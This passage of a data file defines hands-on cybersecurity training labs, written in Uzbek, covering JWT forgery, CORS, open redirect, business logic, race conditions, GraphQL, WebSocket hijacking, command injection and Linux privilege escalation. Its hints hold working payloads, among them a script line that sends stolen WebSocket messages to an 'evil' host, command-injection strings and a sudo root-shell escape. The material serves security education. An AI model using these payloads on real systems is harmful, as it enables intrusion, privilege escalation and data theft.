    category: 'AUTHENTICATION',
    difficulty: 'Medium',
    xp: 200,
    estimatedMinutes: 35,
    isPremium: false,
    description: "Kuchsiz parollarni qayta tiklash mantiqi va 2FA kodini tekshirishdagi zaiflik orqali hisobni egallang.",
    briefing: "2FA tasdiqlash sahifasida kod kiritish limitining yo'qligi (No Rate Limiting) va status kodini 200 ga o'zgartirish orqali tizimga kiring.",
    objectives: [
      { id: 1, title: "2FA so'rovini tahlil qilish", description: "POST /auth/verify-2fa so'rovining tuzilishini aniqlang", autoKey: "auth_2fa_analyzed" },
      { id: 2, title: "Javob manipulyatsiyasi (Response Tampering)", description: "Serverdan kelgan 401 kodini HTTP 200 OK va success:true ga almashtiring", autoKey: "auth_resp_tampered" },
      { id: 3, title: "Admin hisobiga kirish", description: "Admin paneliga kirib maxfiy kalitni qo'lga kiriting", autoKey: "auth_admin_accessed" }
    ],
    hints: [
      { level: 1, title: "Burp Match & Replace", penalty: 15, content: "Server javobini ushlab (Intercept Server Response) o'zgartirish mumkin." },
      { level: 2, title: "JSON", penalty: 25, content: "`{\"success\":false}` ni `{\"success\":true,\"role\":\"admin\"}` ga aylantiring." },
      { level: 3, title: "Bypass", penalty: 35, content: "Mijoz brauzeri faqat server JSON javobiga qarab sahifani ochayotganini tushuning." }
    ]
  },
  {
    id: 22,
    slug: 'weak-session-handling',
    title: 'Weak Session Handling',
    targetApp: 'SecureAuth',
    entryPoint: '/account',
    category: 'AUTHENTICATION',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 35,
    isPremium: true,
    description: "Ketma-ket (sequential) yoki bashorat qilinadigan sessiya tokenlarini tahlil qilib, boshqa foydalanuvchi sessiyasini o'g'irlang.",
    briefing: "Sessiya ID si vaqt shtampi (timestamp) yoki ketma-ket raqamlardan generatsiya qilinadi. Boshqa foydalanuvchilarning sessiyasini bashorat qiling.",
    objectives: [
      { id: 1, title: "Sessiya tokenlarini yig'ish", description: "Ketma-ket 5 ta sessiya tokenini olib qonuniyatni toping", autoKey: "sess_pattern_found" },
      { id: 2, title: "Admin sessiyasini hisoblash", description: "Admin tizimga kirgan vaqtdagi tokenni hisoblab toping", autoKey: "sess_admin_forged" },
      { id: 3, title: "Cookie almashtirish orqali kirish", description: "Cookie qiymatini o'zgartirib admin profiliga kiring", autoKey: "sess_hijack_success" }
    ],
    hints: [
      { level: 1, title: "Format", penalty: 15, content: "Token Base64 ga o'xshaydimi? Uni ochib ko'ring." },
      { level: 2, title: "Timestamp", penalty: 25, content: "`1710000000_105` - bu Unix timestamp va foydalanuvchi ID si." },
      { level: 3, title: "Exploit", penalty: 35, content: "Admin ID = 1 uchun mos timestamp bilan token yasab yuboring." }
    ]
  },

  // 23-24: JWT
  {
    id: 23,
    slug: 'jwt-security',
    title: 'JWT Security',
    targetApp: 'CyberAPI',
    entryPoint: '/api/auth',
    category: 'JWT',
    difficulty: 'Medium',
    xp: 240,
    estimatedMinutes: 40,
    isPremium: true,
    description: "JWT tokenida 'alg': 'none' zaifligidan foydalanib, o'z rolingizni 'user' dan 'admin' ga oshiring.",
    briefing: "API serveri token imzosini tekshirishda algoritmni mijoz belgilashiga ruxsat beradi (`none` algoritmi). Imzoni o'chirib admin tokenini yasang.",
    objectives: [
      { id: 1, title: "JWT tuzilishini tahlil qilish", description: "Header, Payload va Signature qismlarini ajrating", autoKey: "jwt_parts_decoded" },
      { id: 2, title: "alg: none bilan yangi token yasash", description: "Payload dagi rolni admin qilib, imzo qismini bo'sh qoldiring", autoKey: "jwt_none_forged" },
      { id: 3, title: "Admin API ga so'rov yuborish", description: "Soxta token bilan /api/admin/flag ga so'rov yuboring", autoKey: "jwt_flag_accessed" }
    ],
    hints: [
      { level: 1, title: "Header", penalty: 15, content: "Header: `{\"alg\":\"none\",\"typ\":\"JWT\"}` -> Base64Url encode qiling." },
      { level: 2, title: "Imzo", penalty: 25, content: "Token oxiridagi nuqtadan so'ng hech narsa bo'lmasligi kerak: `header.payload.`" },
      { level: 3, title: "Rol", penalty: 40, content: "Payload: `{\"sub\":\"123\",\"role\":\"admin\",\"exp\":9999999999}`" }
    ]
  },
  {
    id: 24,
    slug: 'jwt-authorization',
    title: 'JWT Authorization',
    targetApp: 'CyberAPI',
    entryPoint: '/api/users',
    category: 'JWT',
    difficulty: 'Hard',
    xp: 320,
    estimatedMinutes: 50,
    isPremium: true,
    description: "Kuchsiz HMAC maxfiy kalitini (Secret Key) lug'at (dictionary attack) orqali buzib, to'liq haqiqiy admin tokenini imzolang.",
    briefing: "API serveri HMAC-SHA256 uchun ommabop kalit ('secret', 'admin123', 'jwtsecret') ishlatmoqda. Hashcat/jwt_tool bilan parolni toping.",
    objectives: [
      { id: 1, title: "JWT tokenni tutib olish", description: "Avtorizatsiya so'rovidagi Bearer tokenni oling", autoKey: "jwt_token_captured" },
      { id: 2, title: "Maxfiy kalitni topish (Brute-force)", description: "jwt_tool yoki hashcat orqali HMAC sirli kalitini aniqlang", autoKey: "jwt_secret_cracked" },
      { id: 3, title: "Imzolangan admin tokenini yaratish", description: "Topilgan kalit bilan admin tokenini imzolab flagni oling", autoKey: "jwt_valid_admin_token" }
    ],
    hints: [
      { level: 1, title: "Kalit", penalty: 20, content: "Kalit eng mashhur 100 ta kalit so'zlar ro'yxatida bor." },
      { level: 2, title: "jwt_tool", penalty: 35, content: "`python3 jwt_tool.py <token> -C -d wordlist.txt`" },
      { level: 3, title: "Imzolash", penalty: 50, content: "Topilgan kalit bilan jwt.io da yangi token imzolang." }
    ]
  },

  // 25: CORS
  {
    id: 25,
    slug: 'cors-misconfiguration',
    title: 'CORS Misconfiguration',
    targetApp: 'CyberAPI',
    entryPoint: '/api',
    category: 'CORS',
    difficulty: 'Medium',
    xp: 200,
    estimatedMinutes: 35,
    isPremium: true,
    description: "CORS sarlavhasida `Access-Control-Allow-Origin: *` yoki so'rovdagi ixtiyoriy Origin ni aks ettirish xatosidan foydalanib ma'lumot o'g'irlang.",
    briefing: "API serveri so'rovdagi `Origin: attacker.uz` ni to'g'ridan-to'g'ri `Access-Control-Allow-Credentials: true` bilan qaytarmoqda.",
    objectives: [
      { id: 1, title: "Origin parametrini tekshirish", description: "So'rovga soxta Origin: http://attacker.uz qo'shib javobni tahlil qiling", autoKey: "cors_probe_sent" },
      { id: 2, title: "Eksploit skriptini tuzish", description: "Boshqa domen orqali qurbonning shaxsiy ma'lumotlarini o'qish uchun JS yozing", autoKey: "cors_exploit_written" },
      { id: 3, title: "API kalitlarini tutib olish", description: "Qurbon tashrif buyurganda uning maxfiy API kalitini oling", autoKey: "cors_keys_stolen" }
    ],
    hints: [
      { level: 1, title: "Header", penalty: 15, content: "Origin sarlavhasini o'zgartirib javobdagi Access-Control-Allow-Origin ni ko'ring." },
      { level: 2, title: "Credentials", penalty: 25, content: "Agar `Access-Control-Allow-Credentials: true` bo'lsa, cookie larni o'qish mumkin." },
      { level: 3, title: "XHR", penalty: 35, content: "`fetch('http://api/profile', {credentials: 'include'})`" }
    ]
  },

  // 26-27: Open Redirect & Security Headers
  {
    id: 26,
    slug: 'open-redirect',
    title: 'Open Redirect',
    targetApp: 'CyberPortal',
    entryPoint: '/redirect',
    category: 'OPEN_REDIRECT',
    difficulty: 'Easy',
    xp: 120,
    estimatedMinutes: 20,
    isPremium: false,
    description: "Tizimdan chiqish yoki tilni o'zgartirish funksiyasidagi ochiq qayta yo'naltirish (Open Redirect) zaifligini toping.",
    briefing: "`/redirect?url=https://attacker.uz` tekshirilmasdan foydalanuvchini tashqi zararli saytga yo'naltiradi.",
    objectives: [
      { id: 1, title: "Yo'naltirish parametrini tekshirish", description: "?next= yoki ?url= parametrining ishlashini aniqlang", autoKey: "or_param_tested" },
      { id: 2, title: "Tashqi manzilga yo'naltirish", description: "Domen tekshiruvini aylanib o'tib tashqi saytga yo'naltiring", autoKey: "or_redirect_success" },
      { id: 3, title: "OAuth tokenini tutib olish", description: "Open redirect yordamida OAuth avtorizatsiya kodini o'g'irlang", autoKey: "or_oauth_leaked" }
    ],
    hints: [
      { level: 1, title: "URL", penalty: 10, content: "Parametrga to'g'ridan-to'g'ri `https://google.com` yozib ko'ring." },
      { level: 2, title: "Bypass", penalty: 20, content: "Agar domen tekshirilsa: `//attacker.uz` yoki `https://cyberportal.lab.attacker.uz` ishlating." },
      { level: 3, title: "Kombinatsiya", penalty: 30, content: "Open redirect ko'pincha phishing va token o'g'irlashda zanjirlanadi." }
    ]
  },
  {
    id: 27,
    slug: 'security-headers',
    title: 'Security Headers',
    targetApp: 'CyberPortal',
    entryPoint: '/security',
    category: 'SECURITY_HEADERS',
    difficulty: 'Beginner',
    xp: 100,
    estimatedMinutes: 20,
    isPremium: false,
    description: "CyberPortal serverining xavfsizlik sarlavhalarini (CSP, HSTS, X-Frame-Options) audit qiling va zaifliklarni aniqlang.",
    briefing: "Server javobidagi sarlavhalarni tahlil qiling. Clickjacking va MIME-sniffing zaifliklarini ochuvchi kamchiliklarni ko'rsating.",
    objectives: [
      { id: 1, title: "HTTP sarlavhalarini skanerlash", description: "Barcha xavfsizlik sarlavhalarini ro'yxatlang", autoKey: "sh_headers_scanned" },
      { id: 2, title: "Clickjacking zaifligini tasdiqlash", description: "X-Frame-Options yo'qligidan foydalanib saytni iframe ga joylang", autoKey: "sh_iframe_verified" },
      { id: 3, title: "Audit xulosasini topshirish", description: "Topilgan 3 ta kamchilikni qayd etib flagni oling", autoKey: "sh_audit_completed" }
    ],
    hints: [
      { level: 1, title: "Sarlavhalar", penalty: 10, content: "X-Frame-Options, Content-Security-Policy, Strict-Transport-Security bormi?" },
      { level: 2, title: "Iframe", penalty: 20, content: "Oddiy HTML da `<iframe src=\"http://target\"></iframe>` ochilsa, demak himoya yo'q." },
      { level: 3, title: "CSP", penalty: 30, content: "Agar CSP da `unsafe-inline` bo'lsa, XSS himoyasi butunlay ishlamaydi." }
    ]
  },

  // 28-29: Business Logic
  {
    id: 28,
    slug: 'business-logic-coupon',
    title: 'Business Logic Coupon',
    targetApp: 'ShopFlow',
    entryPoint: '/checkout',
    category: 'BUSINESS_LOGIC',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 35,
    isPremium: false,
    description: "ShopFlow do'konida chegirma kuponlarini qayta-qayta qo'llash orqali mahsulot narxini 0 dollarga tushiring.",
    briefing: "Ilova bir xil kuponni ketma-ket qo'llashni cheklamaydi yoki 10% lik kuponni bir nechta sessiyada qayta ishlatishga yo'l qo'yadi.",
    objectives: [
      { id: 1, title: "Kupon qo'llash so'rovini tahlil qilish", description: "POST /cart/apply-coupon so'rovini tahlil qiling", autoKey: "bl_coupon_req" },
      { id: 2, title: "Kuponni ko'p marta qo'llash", description: "BIRINCHI2024 kuponini savatga ketma-ket 5 marta qo'shing", autoKey: "bl_coupon_reapplied" },
      { id: 3, title: "0 dollar bilan buyurtma berish", description: "To'lov summasini 0 qilib qimmatbaho serverni sotib oling va flagni oling", autoKey: "bl_free_checkout" }
    ],
    hints: [
      { level: 1, title: "Kupon", penalty: 15, content: "Kupon qo'shilganda savatdagi jami summa qanday o'zgaradi?" },
      { level: 2, title: "Takrorlash", penalty: 25, content: "So'rovni bir necha marta takrorlab (Repeat) yuboring." },
      { level: 3, title: "Manfiy narx", penalty: 35, content: "Ba'zida kupon summasi mahsulotdan oshib ketsa, narx manfiy (-) bo'lib qoladi." }
    ]
  },
  {
    id: 29,
    slug: 'business-logic-payment',
    title: 'Business Logic Payment',
    targetApp: 'ShopFlow',
    entryPoint: '/payment',
    category: 'BUSINESS_LOGIC',
    difficulty: 'Hard',
    xp: 320,
    estimatedMinutes: 45,
    isPremium: true,
    description: "To'lov so'rovidagi narx parametrini mijoz tomonidan manipulyatsiya qilib (Price Tampering), 1000$ lik tovarni 1$ ga xarid qiling.",
    briefing: "To'lov shlyuziga yuborilayotgan JSON da `amount` maydoni mijozdan qabul qilinmoqda va server bazadagi haqiqiy narx bilan solishtirmaydi.",
    objectives: [
      { id: 1, title: "To'lov so'rovini ushlash", description: "Burp Suite orqali /checkout/pay so'rovidagi JSON ni ushlang", autoKey: "bl_pay_intercepted" },
      { id: 2, title: "Narx parametrini o'zgartirish", description: "amount: 1000 qiymatini amount: 1.00 ga o'zgartiring", autoKey: "bl_price_tampered" },
      { id: 3, title: "Xaridni yakunlash va litsenziya flagini olish", description: "Muvaffaqiyatli xarid kvitansiyasidagi litsenziya flagini oling", autoKey: "bl_payment_flag" }
    ],
    hints: [
      { level: 1, title: "Parametr", penalty: 20, content: "So'rovda `price`, `amount`, `currency` parametrlarini qidiring." },
      { level: 2, title: "Valyuta", penalty: 35, content: "Agar narx qattiq tekshirilsa, valyutani USD dan boshqa arzonroq valyutaga o'zgartirib ko'ring." },
      { level: 3, title: "Kvitansiya", penalty: 50, content: "So'rov muvaffaqiyatli o'tgach, sahifadagi litsenziya kalitini oling." }
    ]
  },

  // 30: Race Condition
  {
    id: 30,
    slug: 'race-condition',
    title: 'Race Condition',
    targetApp: 'FlashSale',
    entryPoint: '/checkout',
    category: 'RACE_CONDITION',
    difficulty: 'Hard',
    xp: 350,
    estimatedMinutes: 60,
    isPremium: true,
    description: "Cheklangan miqdordagi vaucher yoki sovg'a kartasini multi-threading yordamida bir vaqtning o'zida yuborib balansni oshiring.",
    briefing: "Limit Overrun zaifligi. Baza tranzaksiyasida qulflar (locks) yo'qligi tufayli 10 ta parallel so'rov bir vaqtda tekshiruvdan o'tadi.",
    objectives: [
      { id: 1, title: "Vaucher so'rovini tayyorlash", description: "Bir martalik sovg'a kartasini faollashtirish so'rovini oling", autoKey: "rc_req_prepped" },
      { id: 2, title: "Turbo Intruder / Parallel so'rov yuborish", description: "Bir vaqtning o'zida (single-packet attack) 20 ta so'rov jo'nating", autoKey: "rc_parallel_sent" },
      { id: 3, title: "Balansni ko'p karra oshirish", description: "Balansingizni 1000$ dan oshirib VIP status flagini oling", autoKey: "rc_balance_exploded" }
    ],
    hints: [
      { level: 1, title: "Vaqt", penalty: 20, content: "Oddiy ketma-ket yuborilsa: 'Kupon ishlatilgan'. Bir vaqtda yuborilsachi?" },
      { level: 2, title: "Burp Repeater", penalty: 35, content: "Burp Repeater guruhida 'Send group in parallel (single-packet)' funksiyasidan foydalaning." },
      { level: 3, title: "Mantiq", penalty: 50, content: "Tekshirish va yozish (Check-then-Act) orasidagi millisekundlarda so'rovlar qatnashadi." }
    ]
  },

  // 31-32: API Security
  {
    id: 31,
    slug: 'api-rate-limit',
    title: 'API Rate Limit',
    targetApp: 'CyberAPI',
    entryPoint: '/api',
    category: 'API_SECURITY',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 35,
    isPremium: false,
    description: "API so'rovlar cheklovini (Rate Limiting) aylanib o'tish usullarini (X-Forwarded-For, IP rotation) o'rganing.",
    briefing: "Server 1 minutda 5 ta so'rovdan ko'p yuborgan IP larni bloklaydi. X-Forwarded-For sarlavhasi orqali blokni aylanib o'ting.",
    objectives: [
      { id: 1, title: "Rate limit chegarasini aniqlash", description: "429 Too Many Requests javobini qo'zg'ating", autoKey: "rl_limit_hit" },
      { id: 2, title: "X-Forwarded-For manipulyatsiyasi", description: "Har bir so'rovda IP manzilini soxtalashtiring", autoKey: "rl_xff_bypassed" },
      { id: 3, title: "Admin PIN kodini brute-force qilish", description: "4 xonali PIN kodni topib flagni oling", autoKey: "rl_pin_cracked" }
    ],
    hints: [
      { level: 1, title: "Header", penalty: 15, content: "`X-Forwarded-For: 192.168.1.X` sarlavhasini har bir so'rovda o'zgartiring." },
      { level: 2, title: "Muqobil", penalty: 25, content: "X-Real-IP, Client-IP, X-Originating-IP sarlavhalari ham tekshirilishi mumkin." },
      { level: 3, title: "Intruder", penalty: 35, content: "Burp Intruder da ikkita parametrni (PIN va IP) bir vaqtda o'zgartiring." }
    ]
  },
  {
    id: 32,
    slug: 'api-mass-assignment',
    title: 'API Mass Assignment',
    targetApp: 'CyberAPI',
    entryPoint: '/profile',
    category: 'API_SECURITY',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 35,
    isPremium: true,
    description: "Profilni yangilash API so'roviga kutilmagan `is_admin: true` parametrini qo'shib huquqlarni oshiring.",
    briefing: "Backend framework (masalan, Express/Django/Spring) kiruvchi JSON obyektini filtrlamasdan to'g'ridan-to'g'ri bazaga saqlaydi.",
    objectives: [
      { id: 1, title: "Foydalanuvchi obyekti maydonlarini o'rganish", description: "GET /api/user/me orqali mavjud barcha maydonlarni ko'ring", autoKey: "ma_fields_inspected" },
      { id: 2, title: "Yashirin maydonlarni qo'shish", description: "PATCH so'roviga `role: admin` yoki `is_verified: true` qo'shing", autoKey: "ma_role_injected" },
      { id: 3, title: "Admin imtiyozlarini tasdiqlash", description: "Admin vakolati bilan maxfiy audit jurnalini o'qing", autoKey: "ma_admin_verified" }
    ],
    hints: [
      { level: 1, title: "GET javobi", penalty: 15, content: "GET so'rovida qanday maydonlar bor? `role`, `tier`, `permissions` bormi?" },
      { level: 2, title: "PATCH", penalty: 25, content: "PATCH /api/user/me ga `{\"displayName\":\"Test\",\"role\":\"ADMIN\"}` yuboring." },
      { level: 3, title: "Natija", penalty: 35, content: "Agar server 200 qaytarsa, yangi token oling yoki sahifani yangilang." }
    ]
  },

  // 33-34: GraphQL
  {
    id: 33,
    slug: 'graphql-security',
    title: 'GraphQL Security',
    targetApp: 'GraphQL Lab',
    entryPoint: '/graphql',
    category: 'GRAPHQL',
    difficulty: 'Hard',
    xp: 300,
    estimatedMinutes: 45,
    isPremium: true,
    description: "Introspection so'rovi orqali GraphQL sxemasini to'liq ko'chirib oling va yashirin mutatsiyalarni (mutations) toping.",
    briefing: "Ishlab chiquvchilar `__schema` introspection so'rovini yopishni unutgan. Barcha yashirin turlar va maydonlarni ajratib oling.",
    objectives: [
      { id: 1, title: "Introspection so'rovini yuborish", description: "Standart introspection so'rovi orqali sxemani oling", autoKey: "gql_intro_sent" },
      { id: 2, title: "Yashirin mutatsiyalarni topish", description: "deleteUser yoki updateSystemConfig mutatsiyasini aniqlang", autoKey: "gql_mutation_found" },
      { id: 3, title: "Super-admin mutatsiyasini bajarish", description: "Yashirin mutatsiya orqali maxfiy flagni oling", autoKey: "gql_flag_mutated" }
    ],
    hints: [
      { level: 1, title: "Introspection", penalty: 20, content: "`{__schema{types{name,fields{name}}}}` so'rovini yuboring." },
      { level: 2, title: "Voyager", penalty: 35, content: "GraphQL Voyager yoki InQL orqali olingan sxemani vizuallashtiring." },
      { level: 3, title: "Mutatsiya", penalty: 50, content: "`mutation { grantSuperAdmin(userId: 1) { token } }`" }
    ]
  },
  {
    id: 34,
    slug: 'graphql-authorization',
    title: 'GraphQL Authorization',
    targetApp: 'GraphQL Lab',
    entryPoint: '/graphql',
    category: 'GRAPHQL',
    difficulty: 'Hard',
    xp: 350,
    estimatedMinutes: 50,
    isPremium: true,
    description: "Maydon darajasidagi avtorizatsiya (Field-Level Authorization) xatosi orqali foydalanuvchilarning maxfiy tokenlarini o'g'irlang.",
    briefing: "GraphQL da asosiy so'rov ommaviy bo'lsa-da, uning ichidagi qidiruv maydoni (masalan `user { ssn, creditCard }`) ruxsat tekshiruvisiz ochilmoqda.",
    objectives: [
      { id: 1, title: "Baza so'rovini tuzish", description: "Oddiy mahsulot so'roviga muallif (author) maydonini qo'shing", autoKey: "gql_author_nested" },
      { id: 2, title: "Maxfiy maydonlarni so'rash", description: "author { id, email, passwordHash, apiKey } maydonlarini so'rang", autoKey: "gql_fields_leaked" },
      { id: 3, title: "Admin API kalitini ajratib olish", description: "Olingan apiKey orqali tizimga kirib flagni oling", autoKey: "gql_api_key_flag" }
    ],
    hints: [
      { level: 1, title: "Ilgari surish", penalty: 20, content: "GraphQL ruxsatni faqat query boshida tekshirishi mumkin, ichki maydonlarda emas." },
      { level: 2, title: "Alias", penalty: 35, content: "Agar so'rov bloklansa, maydon nomiga alias bering: `adminData: secret`" },
      { level: 3, title: "Maydonlar", penalty: 50, content: "Ko'pincha `developerSecret` yoki `privateNotes` maydonlari qolib ketadi." }
    ]
  },

  // 35-36: WebSocket
  {
    id: 35,
    slug: 'websocket-security',
    title: 'WebSocket Security',
    targetApp: 'Realtime Support',
    entryPoint: '/chat',
    category: 'WEBSOCKET',
    difficulty: 'Hard',
    xp: 300,
    estimatedMinutes: 45,
    isPremium: true,
    description: "Cross-Site WebSocket Hijacking (CSWSH) zaifligidan foydalanib, foydalanuvchining real-vaqt chat yozishmalarini o'g'irlang.",
    briefing: "WebSocket ulanish handshake so'rovida CSRF tokeni va Origin tekshiruvi yo'q. Qurbon saytga kirganda uning chatini tinglang.",
    objectives: [
      { id: 1, title: "WebSocket Handshake ni tahlil qilish", description: "Sec-WebSocket-Key va Cookie larning uzatilishini tekshiring", autoKey: "ws_handshake_checked" },
      { id: 2, title: "CSWSH exploit sahifasini yaratish", description: "Qurbon brauzerida attacker serveriga WS orqali xabarlarni yo'naltiring", autoKey: "ws_exploit_built" },
      { id: 3, title: "Operator bilan yozishmalarni tutib olish", description: "Maxfiy qo'llab-quvvatlash xabaridagi flagni tuting", autoKey: "ws_chat_intercepted" }
    ],
    hints: [
      { level: 1, title: "Origin", penalty: 20, content: "Handshake so'rovida `Origin: http://evil.com` yuborilganda server 101 Switching Protocols qaytaradimi?" },
      { level: 2, title: "Kod", penalty: 35, content: "`const ws = new WebSocket('ws://target/chat'); ws.onmessage = (e) => fetch('//evil/'+e.data);`" },
      { level: 3, title: "Sessiya", penalty: 50, content: "Brauzer avtomatik ravishda qurbonning cookie fayllarini WS ulanishiga qo'shadi." }
    ]
  },
  {
    id: 36,
    slug: 'websocket-authorization',
    title: 'WebSocket Authorization',
    targetApp: 'Realtime Support',
    entryPoint: '/support',
    category: 'WEBSOCKET',
    difficulty: 'Hard',
    xp: 350,
    estimatedMinutes: 50,
    isPremium: true,
    description: "WebSocket freymlarida xabar turi (message type) va kanal ID larini manipulyatsiya qilib, maxfiy xodimlarning kanaliga ulaning.",
    briefing: "WS kanalida xabar yuborishda `{\"action\": \"join_channel\", \"channel_id\": \"staff-internal\"}` komandasini uzatib ruxsatni buzing.",
    objectives: [
      { id: 1, title: "WS freymlarini ushlash", description: "Burp WebSocket History orqali jo'natilayotgan JSON larni ko'ring", autoKey: "ws_frames_viewed" },
      { id: 2, title: "Kanal o'zgartirish freymini yuborish", description: "Freymdagi channel_id parametrini admin kanaliga o'zgartiring", autoKey: "ws_channel_switched" },
      { id: 3, title: "Ichki komandalar xabarini o'qish", description: "Xodimlar kanalidagi tezkor xabarlar va flagni oling", autoKey: "ws_staff_message_read" }
    ],
    hints: [
      { level: 1, title: "Freymlar", penalty: 20, content: "Burp Repeater da WebSocket freymlarini bevosita jo'natishingiz mumkin." },
      { level: 2, title: "Kanal", penalty: 35, content: "channel_id: 1, 2, 'admin', 'moderator' qiymatlarini sinab ko'ring." },
      { level: 3, title: "Payload", penalty: 50, content: "`{\"type\":\"subscribe\",\"room\":\"internal-incident-response\"}`" }
    ]
  },

  // 37: Command Injection
  {
    id: 37,
    slug: 'command-injection-concepts',
    title: 'Command Injection Concepts',
    targetApp: 'Diagnostics',
    entryPoint: '/tools',
    category: 'COMMAND_INJECTION',
    difficulty: 'Hard',
    xp: 300,
    estimatedMinutes: 45,
    isPremium: true,
    description: "Tarmoq diagnostika panelida ping funksiyasiga buyruq ajratuvchilar (; | &&) qo'shib, serverda buyruq bajaring.",
    briefing: "Server `system('ping -c 3 ' . $ip)` kodini ishlatmoqda. `127.0.0.1; whoami` orqali OS buyruqlarini ijro qiling.",
    objectives: [
      { id: 1, title: "Ajratuvchi belgilarni tekshirish", description: "IP maydoniga `;`, `&&`, `|` belgilarini kiritib javobni taqqoslang", autoKey: "cmd_delimiters_tested" },
      { id: 2, title: "OS buyrug'ini ishga tushirish", description: "127.0.0.1; id yoki 127.0.0.1 | uname -a buyrug'ini bering", autoKey: "cmd_executed" },
      { id: 3, title: "Fayl tizimidan flagni o'qish", description: "127.0.0.1; cat /secret/flag.txt buyrug'i natijasini oling", autoKey: "cmd_flag_retrieved" }
    ],
    hints: [
      { level: 1, title: "Ajratuvchilar", penalty: 20, content: "Linux da bir necha buyruqni ketma-ket bajarish: `;`, `&&`, `||`, `|`, `$(...)`" },
      { level: 2, title: "Bo'shliq bo'lmasa", penalty: 35, content: "Bo'shliq bloklangan bo'lsa: `${IFS}` yoki `{cat,/flag.txt}` ishlating." },
      { level: 3, title: "Payload", penalty: 50, content: "`;cat$IFS/secret/flag.txt`" }
    ]
  },

  // 38-45: Linux Labs
  {
    id: 38,
    slug: 'linux-file-permissions',
    title: 'Linux File Permissions',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Beginner',
    xp: 120,
    estimatedMinutes: 20,
    isPremium: false,
    description: "Terminalda chmod, chown va SUID bitlari bilan ishlashni o'rganing. Maxsus ruxsatlarga ega fayllarni toping.",
    briefing: "Tizimda noto'g'ri sozlangan ruxsatlar tufayli oddiy foydalanuvchi o'qishi mumkin bo'lmagan fayllarni oching.",
    objectives: [
      { id: 1, title: "Fayl ruxsatlarini tahlil qilish", description: "ls -la yordamida rwx bitlarini o'rganing", autoKey: "lnx_ls_la" },
      { id: 2, title: "SUID fayllarini qidirish", description: "find / -perm -4000 2>/dev/null buyrug'ini bajaring", autoKey: "lnx_suid_found" },
      { id: 3, title: "Himoyalangan faylni o'qish", description: "SUID dasturi yordamida /root/flag.txt ni o'qing", autoKey: "lnx_perm_flag" }
    ],
    hints: [
      { level: 1, title: "SUID", penalty: 10, content: "SUID binar fayllari uni ishga tushirgan har qanday odamga fayl egasi (root) vakolatini beradi." },
      { level: 2, title: "GTFOBins", penalty: 20, content: "Topilgan SUID binarini gtfobins.github.io saytidan qidiring." },
      { level: 3, title: "Buyruq", penalty: 30, content: "Masalan `base64 /root/flag.txt | base64 -d`" }
    ]
  },
  {
    id: 39,
    slug: 'linux-processes',
    title: 'Linux Processes',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Beginner',
    xp: 130,
    estimatedMinutes: 25,
    isPremium: false,
    description: "Ishlayotgan jarayonlarni (ps, top, lsof) tahlil qiling va yashirin cron job yoki fondagi vazifalarni aniqlang.",
    briefing: "Har 1 daqiqada root nomidan ishlayotgan shubhali skript mavjud. Jarayonni ushlang va tahlil qiling.",
    objectives: [
      { id: 1, title: "Jarayonlar ro'yxatini ko'rish", description: "ps aux yoki pspy orqali davriy jarayonlarni aniqlang", autoKey: "lnx_ps_checked" },
      { id: 2, title: "Cron job konfiguratsiyasini topish", description: "/etc/crontab va /var/spool/cron fayllarini tekshiring", autoKey: "lnx_cron_found" },
      { id: 3, title: "Skript parametrlaridan flagni olish", description: "Jarayon buyrug'idagi maxfiy argumentni oling", autoKey: "lnx_process_flag" }
    ],
    hints: [
      { level: 1, title: "ps", penalty: 10, content: "`ps -ef --forest` jarayonlar daraxtini ko'rsatadi." },
      { level: 2, title: "Cron", penalty: 20, content: "ls -la /etc/cron* kataloglarini tekshiring." },
      { level: 3, title: "Monitor", penalty: 30, content: "Davriy skript argumentlarida token uzatilmoqda." }
    ]
  },
  {
    id: 40,
    slug: 'linux-logs',
    title: 'Linux Logs',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Easy',
    xp: 150,
    estimatedMinutes: 25,
    isPremium: false,
    description: "/var/log/auth.log va syslog jurnallaridan muvaffaqiyatsiz kirish urinishlarini (SSH brute-force) aniqlang.",
    briefing: "Serverga qilingan hujum izlarini loglar orqali tiklang. Hujumchining IP manzili va urinishlar sonini hisoblang.",
    objectives: [
      { id: 1, title: "Auth log faylini ochish", description: "/var/log/auth.log yoki secure jurnalini oching", autoKey: "lnx_auth_log_read" },
      { id: 2, title: "Muvaffaqiyatsiz urinishlarni sanash", description: "grep 'Failed password' orqali urinishlarni sanang", autoKey: "lnx_failed_logins" },
      { id: 3, title: "Muvaffaqiyatli kirgan IP ni topish", description: "'Accepted password' qaydidan hujumchi IP va flagni toping", autoKey: "lnx_accepted_login" }
    ],
    hints: [
      { level: 1, title: "Grep", penalty: 10, content: "`grep 'Failed password' /var/log/auth.log | wc -l`" },
      { level: 2, title: "Awk", penalty: 20, content: "Hujumchi IP larini ajratish: `awk '{print $(NF-3)}'`" },
      { level: 3, title: "Muvaffaqiyat", penalty: 30, content: "`grep 'Accepted' /var/log/auth.log`" }
    ]
  },
  {
    id: 41,
    slug: 'linux-users-groups',
    title: 'Linux Users/Groups',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Easy',
    xp: 160,
    estimatedMinutes: 25,
    isPremium: false,
    description: "/etc/passwd, /etc/shadow va sudoers fayllarini tahlil qiling. Sudo ruxsatlaridagi zaiflikni aniqlang.",
    briefing: "Foydalanuvchiga `sudo -l` berilganda bitta dasturni parolsiz ishlatish ruxsati bor. Undan foydalanib rootga chiqing.",
    objectives: [
      { id: 1, title: "Sudo vakolatlarini tekshirish", description: "sudo -l buyrug'i orqali ruxsatlarni tekshiring", autoKey: "lnx_sudo_l" },
      { id: 2, title: "Parolsiz binar dasturni aniqlash", description: "NOPASSWD bilan ko'rsatilgan dasturni toping", autoKey: "lnx_nopasswd_bin" },
      { id: 3, title: "Root terminalini ochish", description: "GTFOBins usuli bilan root qobig'ini ochib flagni oling", autoKey: "lnx_root_flag" }
    ],
    hints: [
      { level: 1, title: "Sudo", penalty: 10, content: "`sudo -l` nima chiqardi? Qaysi binar yozilgan?" },
      { level: 2, title: "Masalan vim", penalty: 25, content: "`sudo vim -c ':!/bin/sh'` root shell ochadi." },
